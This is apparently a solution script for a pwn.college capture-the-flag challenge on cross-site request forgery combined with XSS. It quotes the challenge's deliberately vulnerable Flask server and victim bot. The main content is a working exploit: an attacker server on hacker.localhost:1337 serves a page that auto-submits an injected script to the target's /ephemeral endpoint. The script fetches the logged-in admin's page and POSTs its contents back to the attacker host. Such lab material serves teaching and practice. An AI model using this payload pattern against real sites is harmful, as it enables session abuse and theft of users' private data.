import os
import re
import requests
import sys
import time
import urllib.parse
from flask import Flask, request


"""
Theory:
Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted
actions on a web application in which they’re currently authenticated.
CSRF does not change the website code itself, bug rather lets the user use the website
in a way the user did not intend to. I.e. we could set up a malicious server and send the
respective link via email to the user. Once the user clicks on the link while being authenticated
to the website we are actually targeting with our attack, we might force the user to send a request
to the target website by returning a redirect or form request from our malicious server.

Specific to this challenge:
CSRF can be used in combination with XSS. We force the user to make authenticated requests
against the target website, that inject a malicious script. We thereby let the user execute the
XSS attack for us.
"""

'''
Server:
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

flag = open("/flag").read().strip() if os.geteuid() == 0 else "pwn.college{fake_flag}"

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE posts AS SELECT ? AS content, "admin" AS author, FALSE AS published""", [flag])
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [flag[-20:]])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
db.execute("""INSERT INTO users SELECT "hacker" as username, "1337" as password""")

@app.route("/login", methods=["POST"])
def challenge_login():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    # https://www.sqlite.org/lang_select.html
    user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["username"] = username
    return flask.redirect("/")

@app.route("/draft", methods=["POST"])
def challenge_draft():
    username = flask.session.get("username", None)
    if not username:
        flask.abort(403, "Log in first!")

    if username == "admin":
        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")

    content = flask.request.form.get("content", "")
    # https://www.sqlite.org/lang_insert.html
    db.execute(
        "INSERT INTO posts (content, author, published) VALUES (?, ?, ?)",
        (content, username, bool(flask.request.form.get("publish")))
    )
    return flask.redirect("/")

@app.route("/publish", methods=["POST"])
def challenge_publish():
    username = flask.session.get("username", None)
    if not username:
        flask.abort(403, "Log in first!")

    if username == "admin":
        flask.abort(400, "pwnpost no longer supports admin posting due to rampant flag disclosure")

    # https://www.sqlite.org/lang_update.html
    db.execute("UPDATE posts SET published = TRUE WHERE author = ?", [username])
    return flask.redirect("/")

@app.route("/ephemeral", methods=["GET"])
def challenge_ephemeral():
    return f"""
        <html><body>
        <h1>You have received an ephemeral message!</h1>
        The message: {flask.request.args.get("msg", "(none)")}
        <hr><form>Craft an ephemeral message:<input type=text name=msg action=/ephemeral><input type=submit value=Submit></form>
        </body></html>
    """

@app.route("/", methods=["GET"])
def challenge_get():
    page = "<html><body>\nWelcome to pwnpost, now with users!<hr>\n"
    username = flask.session.get("username", None)
    if username:
        page += """
            <form action=draft method=post>
              Post:<textarea name=content>Write something!</textarea>
              <input type=checkbox name=publish>Publish
              <input type=submit value=Save>
            </form><br>
            <form action=publish method=post><input type=submit value="Publish All Drafts"></form><hr>
        """

        for post in db.execute("SELECT * FROM posts").fetchall():
            page += f"""<h2>Author: {post["author"]}</h2>"""
            if post["author"] == username:
                page += "<b>YOUR POST:</b> " + post["content"] + "<hr>\n"
            elif username == "admin":
                page += "<b>NON-ADMIN POST HIDDEN FOR SAFETY</b>"
            elif post["published"]:
                page += post["content"] + "<hr>\n"
            else:
                page += f"""(Draft post, showing first 12 characters):<br>{post["content"][:12]}<hr>"""
    else:
        page += """
            <form action=login method=post>
              Username:<input type=text name=username>
              Password:<input type=text name=password>
              <input type=submit name=submit value=Login>
            </form><hr>
        """

    return page + "</body></html>"

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)

Victim:
#!/opt/pwn.college/python

import psutil
import urllib
import atexit
import time
import sys
import os

from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException

os.setuid(os.geteuid())
os.environ.clear()
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

options = FirefoxOptions()
options.add_argument("--headless")
service = FirefoxService(log_path="/dev/null")
browser = webdriver.Firefox(service=service, options=options)
atexit.register(browser.quit)

open_ports = { s.laddr.port for s in psutil.net_connections(kind="inet") if s.status == 'LISTEN' }
if 80 not in open_ports:
    print("Service doesn't seem to be running?")
    sys.exit(1)
challenge_url = "http://challenge.localhost:80/"
flag = open("/flag").read().strip()

print(f"Visiting {challenge_url}")
browser.get(challenge_url)

print("Logging in as admin...")
browser.find_element(By.NAME, "username").send_keys("admin")
browser.find_element(By.NAME, "password").send_keys(flag[-20:])
browser.find_element(By.NAME, "submit").submit()
time.sleep(3)
print("Logged in!")

print("Visiting the attacker's website (http://hacker.localhost:1337/)...")
browser.get("http://hacker.localhost:1337/")
time.sleep(3)

print("Visited! Go check if the attack worked!")
'''

def challenge():
	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.")
	exit(1)

def attack():
	app = Flask(__name__)

	@app.route("/", methods=["GET"])
	def xss_via_csrf():
		print(f"Inject xss!")
		sys.stdout.flush()
		return '<html><body>' + \
			'<form name=pub action=http://challenge.localhost:80/ephemeral method="get">' + \
			'<input id="xss" type="hidden" name="msg"/>' + \
			'</form>' + \
			'<script>' + \
			'let xss = "<script";xss += ">";' + \
			'xss += "fetch(\'http://challenge.localhost:80/\').then((resp) => resp.text())' + \
			'.then((text) => {' + \
			'fetch(\'http://hacker.localhost:1337/\', {\'method\': \'POST\'' + \
			', \'body\': text});});";' + \
			'xss += "</script";xss += ">";' + \
			'document.getElementById("xss").value = xss;' + \
			'document.forms["pub"].submit();' + \
			'</script>' + \
			'</body></html>'

	@app.route("/", methods=["POST"])
	def show_flag():
		print(request.data)
		sys.stdout.flush()
		return ""

	app.run("hacker.localhost", 1337, use_reloader=False)
	exit(1)

pat0 = re.compile(r".*Running on http://challenge.localhost:80\n")
pat1 = re.compile(r".*Running on http://hacker.localhost:1337\n")
challenge_up = False
attacker_up = False
r1, w1 = os.pipe()

for proc in [challenge, attack]:
	pid = os.fork()

	if pid == -1:
		print("Error fork.")
		exit(1)

	if pid == 0:
		os.close(r1)

		os.dup2(w1, 1)
		os.close(w1)

		# stdout as stderr
		os.dup2(1, 2)

		proc()

os.close(w1)

read_file = os.fdopen(r1, "r")

while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		challenge_up = True

	m = pat1.match(line)
	if m:
		attacker_up = True

	if challenge_up and attacker_up:
		challenge_up = False
		attacker_up = False
		pid = os.fork()

		if pid == -1:
			print("Error fork.")
			exit(1)

		if pid == 0:
			os.execv("/challenge/victim", ["/challenge/victim"])
			print("Error execv.")
			exit(1)
